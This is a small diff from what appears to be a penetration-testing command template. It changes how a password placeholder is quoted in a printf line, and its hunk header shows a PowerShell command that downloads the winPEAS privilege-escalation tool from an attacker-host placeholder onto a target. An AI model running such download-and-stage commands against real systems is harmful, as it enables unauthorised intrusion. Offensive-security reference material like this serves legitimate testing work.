@@ -50,5 +50,5 @@ iwr -UseBasicParsing -Uri 'http://{{LHOST}}:8000/winPEASx64.exe' -OutFile '.\win
 ## Print profile values
 
 ```bash
-printf '%s\n' '{{RHOST}}' '{{PASS}}'
+printf '%s\n' '{{RHOST}}' {{PASS|sh}}
 ```
